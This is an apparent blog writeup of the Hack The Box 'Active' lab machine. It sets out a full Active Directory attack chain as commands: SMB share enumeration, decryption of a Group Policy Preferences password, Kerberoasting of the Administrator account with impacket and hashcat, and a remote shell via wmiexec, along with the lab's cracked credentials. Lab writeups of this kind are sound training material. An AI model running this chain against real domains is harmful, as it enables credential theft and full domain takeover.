---
title: "Writeup: Active from Hack The Box"
author: Asier Núñez
pubDatetime: 2025-01-08T19:51:29.606Z
slug: active-writeup
featured: false
draft: false
tags:
  - Windows
  - Active Directory
  - Security
  - Ethical Hacking
  - GPP
  - SPN
  - Hashcat
  - TGT
description: "Writeup for the Active machine from Hack The Box, a Windows Active Directory"
---

# Initial Foothold

If we start by enumerating the SMB shares, we can see that we have READ permissions at `Replication`.

```bash
crackmapexec smb 10.129.93.100 -u '' -p '' --shares
```

![CME-Shares](@assets/images/writeups/htb/active/cme-shares.png)

In one of the folders, we can find a file called `Groups.xml` which contains the password for the `SVC_TGS` user.
This password is encrypted using the `Group Policy Preferences` method. To decrypt it, we can use the `gpp-decrypt` tool that uses the AES key that was made public by Microsoft.

![GPP-Decrypt](@assets/images/writeups/htb/active/gpp-decrypt.png)

```
SVC_TGS:GPPstillStandingStrong2k18
```

Once we have the password, we can check if this user has access to any other share.

```bash
crackmapexec smb 10.129.93.100 -u SVC_TGS -p 'GPPstillStandingStrong2k18' --shares
```

![CME-Shares-SVC](@assets/images/writeups/htb/active/cme-shares-svc.png)

Under the `Users` share, we can find the `user.txt` flag.

# Privilege Escalation

If we check for users with SPNs using `GetUserSPNs.py`, we can see that the `Administrator` user has an SPN associated.

```bash
impacket-GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.93.100
```

![SPNS](@assets/images/writeups/htb/active/spns.png)

As we see in the previous image, the `Administrator` user has an SPN associated with the `cifs` service. This means that we can request a TGS for this service and try to crack it to obtain the password.

```bash
impacket-GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.129.93.100 -request
```

![SPNS-Request](@assets/images/writeups/htb/active/spns-request.png)

Now with the help of `hashcat`, we can crack the TGS.

```bash
hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt
```

```
administrator:Ticketmaster1968
```

Now we can use `wmiexec.py` to execute commands as the `Administrator` user.

```bash
impacket-wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.93.100
```

![WMIExec](@assets/images/writeups/htb/active/wmi-exec.png)
